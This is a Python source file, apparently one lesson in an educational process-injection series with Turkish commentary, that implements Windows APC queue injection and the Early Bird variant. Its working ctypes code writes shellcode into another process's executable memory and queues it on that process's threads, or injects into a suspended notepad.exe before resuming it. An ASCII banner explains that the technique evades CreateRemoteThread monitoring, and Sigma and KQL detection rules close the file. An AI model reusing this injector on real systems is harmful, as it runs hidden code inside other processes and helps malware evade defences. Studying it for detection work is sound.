"""
Technique 4: APC Queue Injection
=================================
Asynchronous Procedure Call kullanarak shellcode injection.

MITRE ATT&CK: T1055.004 - Process Injection: Asynchronous Procedure Call

API Çağrı Sırası:
1. OpenProcess() - Hedef process'e handle al
2. VirtualAllocEx() - Bellek ayır
3. WriteProcessMemory() - Shellcode yaz
4. OpenThread() - Hedef thread'e handle al
5. QueueUserAPC() - APC queue'ya ekle

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.win_api import (
    OpenProcess, OpenThread, VirtualAllocEx, WriteProcessMemory,
    VirtualProtectEx, QueueUserAPC, CloseHandle,
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    PAGE_EXECUTE_READ, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
    GetLastError
)

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                      TECHNIQUE 4: APC QUEUE INJECTION                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 AÇIKLAMA:                                                                ║
║  ─────────────                                                               ║
║  APC (Asynchronous Procedure Call) injection, Windows'un APC mekanizmasını   ║
║  kullanarak shellcode çalıştırır. CreateRemoteThread'e alternatif olarak     ║
║  daha az izlenen bir yöntemdir.                                              ║
║                                                                              ║
║  💡 APC NEDİR?                                                               ║
║  ──────────────                                                              ║
║  Windows'ta her thread'in bir APC kuyruğu vardır. Thread "alertable"         ║
║  duruma geçtiğinde (WaitForSingleObjectEx, SleepEx, vb.) bu kuyruktaki       ║
║  fonksiyonlar otomatik olarak çalıştırılır.                                  ║
║                                                                              ║
║  🔄 API ÇAĞRI AKIŞI:                                                         ║
║  ───────────────────                                                         ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                                                                     │    ║
║  │  ┌─────────────┐                                                    │    ║
║  │  │ OpenProcess │ ──► Handle to target process                       │    ║
║  │  └──────┬──────┘                                                    │    ║
║  │         │                                                           │    ║
║  │         ▼                                                           │    ║
║  │  ┌──────────────┐                                                   │    ║
║  │  │VirtualAllocEx│ ──► Allocate memory in target                     │    ║
║  │  └──────┬───────┘                                                   │    ║
║  │         │                                                           │    ║
║  │         ▼                                                           │    ║
║  │  ┌─────────────────┐                                                │    ║
║  │  │WriteProcessMem  │ ──► Write shellcode                            │    ║
║  │  └──────┬──────────┘                                                │    ║
║  │         │                                                           │    ║
║  │         ▼                                                           │    ║
║  │  ┌─────────────┐                                                    │    ║
║  │  │ OpenThread  │ ──► Handle to target thread                        │    ║
║  │  └──────┬──────┘                                                    │    ║
║  │         │                                                           │    ║
║  │         ▼                                                           │    ║
║  │  ┌──────────────┐                                                   │    ║
║  │  │ QueueUserAPC │ ──► Queue shellcode as APC                        │    ║
║  │  └──────────────┘                                                   │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║                              ║                                               ║
║                              ▼                                               ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                         TARGET PROCESS                              │    ║
║  │                                                                     │    ║
║  │   Thread APC Queue                                                  │    ║
║  │   ┌────────────────────────────────────────────┐                   │    ║
║  │   │ [1] System APC                             │                   │    ║
║  │   │ [2] Our Shellcode ◄── QueueUserAPC added  │                   │    ║
║  │   │ [3] ...                                    │                   │    ║
║  │   └────────────────────────────────────────────┘                   │    ║
║  │                                                                     │    ║
║  │   When thread enters "alertable" state:                             │    ║
║  │   - SleepEx()                                                       │    ║
║  │   - WaitForSingleObjectEx()                                         │    ║
║  │   - WaitForMultipleObjectsEx()                                      │    ║
║  │   - MsgWaitForMultipleObjectsEx()                                   │    ║
║  │                                                                     │    ║
║  │   ┌─────────────────────┐                                           │    ║
║  │   │ SHELLCODE EXECUTES! │ ◄── APC queue is processed               │    ║
║  │   └─────────────────────┘                                           │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  🎯 AVANTAJLARI:                                                             ║
║  ────────────────                                                            ║
║  • CreateRemoteThread kullanmaz (daha az izlenen)                            ║
║  • Yeni thread oluşturmaz                                                    ║
║  • Mevcut thread üzerinde çalışır                                            ║
║                                                                              ║
║  ⚠️ DEZAVANTAJLARI:                                                          ║
║  ──────────────────                                                          ║
║  • Thread "alertable" duruma geçmeli (garanti değil)                         ║
║  • Çalışma zamanı belirsiz                                                   ║
║  • Bazı process'lerde hiç çalışmayabilir                                     ║
║                                                                              ║
║  🛡️ TESPİT:                                                                  ║
║  ───────────                                                                 ║
║  • QueueUserAPC API çağrısı                                                  ║
║  • Cross-process APC queue                                                   ║
║  • ETW: Microsoft-Windows-Threat-Intelligence                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def get_process_threads(pid: int) -> list:
    """
    Process'e ait tüm thread ID'lerini döndür.
    
    Args:
        pid: Process ID
    
    Returns:
        list: Thread ID listesi
    """
    import subprocess
    
    threads = []
    
    try:
        # PowerShell ile thread listesi al
        cmd = f'(Get-Process -Id {pid}).Threads | Select-Object -ExpandProperty Id'
        output = subprocess.check_output(['powershell', '-Command', cmd], text=True)
        
        for line in output.strip().split('\n'):
            try:
                threads.append(int(line.strip()))
            except:
                pass
    except:
        pass
    
    return threads

def find_alertable_thread(pid: int) -> int:
    """
    Alertable duruma geçebilecek thread bul.
    
    Not: Bu basit bir implementasyon, gerçekte thread state analizi gerekir.
    """
    threads = get_process_threads(pid)
    if threads:
        return threads[0]  # İlk thread'i döndür
    return 0

# ============================================================================
# APC INJECTION
# ============================================================================

def inject_apc(shellcode: bytes, target_pid: int, verbose: bool = True) -> bool:
    """
    APC Queue Injection gerçekleştir.
    
    Args:
        shellcode: Çalıştırılacak shellcode
        target_pid: Hedef process PID'i
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print(TECHNIQUE_INFO)
        print(f"\n🎯 Hedef PID: {target_pid}")
        print("="*60)
    
    # Step 1: Open process
    if verbose:
        print("\n[1/5] OpenProcess() - Process handle alma...")
    
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
    
    if not process_handle:
        print(f"❌ OpenProcess başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Process handle: 0x{process_handle:X}")
    
    try:
        # Step 2: Allocate memory
        if verbose:
            print("\n[2/5] VirtualAllocEx() - Bellek ayırma...")
        
        remote_addr = VirtualAllocEx(
            process_handle,
            None,
            len(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if not remote_addr:
            print(f"❌ VirtualAllocEx başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Bellek ayrıldı: 0x{remote_addr:016X}")
        
        # Step 3: Write shellcode
        if verbose:
            print("\n[3/5] WriteProcessMemory() - Shellcode yazma...")
        
        bytes_written = ctypes.c_size_t()
        result = WriteProcessMemory(
            process_handle,
            remote_addr,
            shellcode,
            len(shellcode),
            ctypes.byref(bytes_written)
        )
        
        if not result:
            print(f"❌ WriteProcessMemory başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Yazıldı: {bytes_written.value} bytes")
        
        # Step 4: Find and open thread
        if verbose:
            print("\n[4/5] OpenThread() - Thread handle alma...")
        
        threads = get_process_threads(target_pid)
        
        if not threads:
            print("❌ Thread bulunamadı!")
            return False
        
        if verbose:
            print(f"   📋 Bulunan thread'ler: {threads[:5]}...")
        
        # Try to queue APC to all threads
        success_count = 0
        
        for tid in threads:
            thread_handle = OpenThread(THREAD_ALL_ACCESS, False, tid)
            
            if not thread_handle:
                continue
            
            try:
                # Step 5: Queue APC
                result = QueueUserAPC(remote_addr, thread_handle, None)
                
                if result:
                    success_count += 1
                    if verbose:
                        print(f"   ✅ APC queued to TID: {tid}")
            finally:
                CloseHandle(thread_handle)
        
        if verbose:
            print(f"\n[5/5] Sonuç:")
            print(f"   📊 Toplam thread: {len(threads)}")
            print(f"   ✅ APC queued: {success_count}")
        
        if success_count > 0:
            if verbose:
                print("\n" + "="*60)
                print("🎉 APC INJECTION BAŞARILI!")
                print("   ⚠️ Shellcode, thread alertable duruma geçtiğinde çalışacak")
                print("   💡 Hedef uygulamada bir işlem yapın (dialog açın, vb.)")
                print("="*60)
            return True
        else:
            print("❌ Hiçbir thread'e APC eklenemedi")
            return False
        
    finally:
        CloseHandle(process_handle)

# ============================================================================
# EARLY BIRD INJECTION (Variant)
# ============================================================================

def early_bird_injection(shellcode: bytes, target_exe: str, verbose: bool = True) -> bool:
    """
    Early Bird APC Injection - CREATE_SUSPENDED ile process oluştur,
    APC queue et, sonra resume et.
    
    Bu variant daha güvenilir çünkü:
    - Thread zaten suspended
    - Resume edildiğinde APC işlenecek
    - Alertable wait gerekmiyor
    
    Args:
        shellcode: Çalıştırılacak shellcode
        target_exe: Hedef executable
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    from utils.win_api import (
        CreateProcessW, ResumeThread, STARTUPINFO, PROCESS_INFORMATION,
        CREATE_SUSPENDED
    )
    
    if verbose:
        print("\n🐦 EARLY BIRD APC INJECTION")
        print("="*60)
        print("   Suspended process oluşturup APC queue ediyoruz...")
    
    # Create suspended process
    startup_info = STARTUPINFO()
    startup_info.cb = ctypes.sizeof(STARTUPINFO)
    process_info = PROCESS_INFORMATION()
    
    result = CreateProcessW(
        target_exe, None, None, None, False,
        CREATE_SUSPENDED,  # SUSPENDED!
        None, None,
        ctypes.byref(startup_info),
        ctypes.byref(process_info)
    )
    
    if not result:
        print(f"❌ CreateProcess başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Suspended process: PID={process_info.dwProcessId}")
    
    try:
        # Allocate and write
        remote_addr = VirtualAllocEx(
            process_info.hProcess, None, len(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        
        if not remote_addr:
            print("❌ VirtualAllocEx başarısız!")
            ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
            return False
        
        bytes_written = ctypes.c_size_t()
        WriteProcessMemory(
            process_info.hProcess, remote_addr, shellcode,
            len(shellcode), ctypes.byref(bytes_written)
        )
        
        if verbose:
            print(f"   ✅ Shellcode yazıldı: 0x{remote_addr:016X}")
        
        # Queue APC to main thread
        result = QueueUserAPC(remote_addr, process_info.hThread, None)
        
        if not result:
            print("❌ QueueUserAPC başarısız!")
            ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
            return False
        
        if verbose:
            print(f"   ✅ APC queued to main thread")
        
        # Resume thread - APC will execute immediately
        ResumeThread(process_info.hThread)
        
        if verbose:
            print(f"   ✅ Thread resumed - Shellcode çalışıyor!")
            print("\n" + "="*60)
            print("🎉 EARLY BIRD INJECTION BAŞARILI!")
            print("="*60)
        
        return True
        
    finally:
        CloseHandle(process_info.hThread)
        CloseHandle(process_info.hProcess)

# ============================================================================
# DETECTION RULES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 ETW MONITORING:                                                          ║
║  ──────────────────                                                          ║
║                                                                              ║
║  // Microsoft-Windows-Threat-Intelligence provider                           ║
║  // Event: KERNEL_THREATINT_TASK_QUEUEUSERAPC                               ║
║                                                                              ║
║  📋 SIGMA RULE:                                                              ║
║  ──────────────                                                              ║
║                                                                              ║
║  title: QueueUserAPC Injection                                               ║
║  status: experimental                                                        ║
║  logsource:                                                                  ║
║    product: windows                                                          ║
║    category: api_call                                                        ║
║  detection:                                                                  ║
║    selection:                                                                ║
║      ApiCall: "QueueUserAPC"                                                 ║
║      CrossProcess: true                                                      ║
║    condition: selection                                                      ║
║  level: high                                                                 ║
║  tags:                                                                       ║
║    - attack.t1055.004                                                        ║
║                                                                              ║
║  📋 KQL QUERY:                                                               ║
║  ─────────────                                                               ║
║                                                                              ║
║  DeviceEvents                                                                ║
║  | where ActionType == "QueueUserApcRemoteApiCall"                           ║
║  | project Timestamp, DeviceName,                                            ║
║            InitiatingProcessFileName, InitiatingProcessId,                   ║
║            TargetProcessFileName, TargetProcessId                            ║
║                                                                              ║
║  // Early Bird Detection - Suspended process + APC                           ║
║  DeviceProcessEvents                                                         ║
║  | where ProcessCreationFlags has "CREATE_SUSPENDED"                         ║
║  | join kind=inner (                                                         ║
║      DeviceEvents                                                            ║
║      | where ActionType == "QueueUserApcRemoteApiCall"                       ║
║    ) on $left.ProcessId == $right.TargetProcessId                            ║
║                                                                              ║
║  📋 BEHAVIORAL INDICATORS:                                                   ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  • Cross-process QueueUserAPC çağrısı                                        ║
║  • VirtualAllocEx ardından QueueUserAPC                                      ║
║  • CREATE_SUSPENDED + QueueUserAPC + ResumeThread (Early Bird)              ║
║  • Unusual APC count in thread                                               ║
║  • APC routine address in private memory                                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    print("\n🎯 APC Injection Seçenekleri:")
    print("   1. Mevcut process'e APC injection")
    print("   2. Early Bird injection (yeni process)")
    
    choice = input("\nSeçim (1/2): ").strip()
    
    # Load shellcode
    try:
        from payloads.test_shellcodes import CALC_SHELLCODE_X64
        shellcode = CALC_SHELLCODE_X64
        print(f"\n📦 Shellcode yüklendi: {len(shellcode)} bytes")
    except ImportError:
        shellcode = bytes([0x90] * 100 + [0xC3])
    
    if choice == "1":
        # Regular APC injection
        pid = input("Hedef PID: ").strip()
        try:
            inject_apc(shellcode, int(pid))
        except ValueError:
            print("Geçersiz PID")
    else:
        # Early Bird
        target = "C:\\Windows\\System32\\notepad.exe"
        confirm = input(f"Early Bird: {target} kullanılsın mı? (y/n): ").strip().lower()
        if confirm == 'y':
            early_bird_injection(shellcode, target)
    
    print(DETECTION_RULES)
